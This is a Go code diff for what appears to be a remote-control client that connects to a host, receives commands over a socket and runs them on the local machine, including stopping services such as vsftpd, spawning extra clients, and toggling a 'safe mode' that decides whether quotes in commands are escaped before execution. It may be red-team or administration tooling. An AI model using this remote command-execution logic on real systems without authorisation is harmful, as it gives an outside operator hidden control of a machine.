@@ -10,9 +10,12 @@ import (
 	"strings"
 )
 
-var HOST_IP string = GetIP() //"192.168.3.6"
+var HOST_IP string //"192.168.3.6"
+var SAFE_MODE bool
 
 func main() {
+	HOST_IP = GetIP()
+	SAFE_MODE = false
 	connectPort := GetPort()
 	if connectPort == "-1" {
 		return
@@ -146,6 +149,8 @@ func EstablishConnection(port string) {
 								Execute(FormatCommand("systemctl stop vsftpd"))
 								respond("FTP disabled.\n", conn)
 							}
+						} else {
+							respond("FTP service (vsftpd) not found.\n", conn)
 						}
 					case "icmp":
 						switch brks[1] {
@@ -184,6 +189,14 @@ func EstablishConnection(port string) {
 				case "child":
 					respond("Spawned unencoded client\n", conn)
 					go unencodedClient()
+				case "SAFEMODE:OFF":
+					SAFE_MODE = false
+					respond("Disabled safe mode.\n", conn)
+				case "SAFEMODE:ON":
+					SAFE_MODE = true
+					respond("Enabled safe mode.\n", conn)
+				default:
+					respond("Error: Command not supported by client.\n", conn)
 				}
 			}
 		} else {
@@ -212,8 +225,10 @@ func CheckService(service string) bool {
 }
 
 func FormatCommand(command string) string {
+	if SAFE_MODE {
+		return strings.Replace(command, "\"", "\\\"", -1)
+	}
 	return command
-	return strings.Replace(command, "\"", "\\\"", -1)
 }
 
 func ExecuteList(command []string) []string {
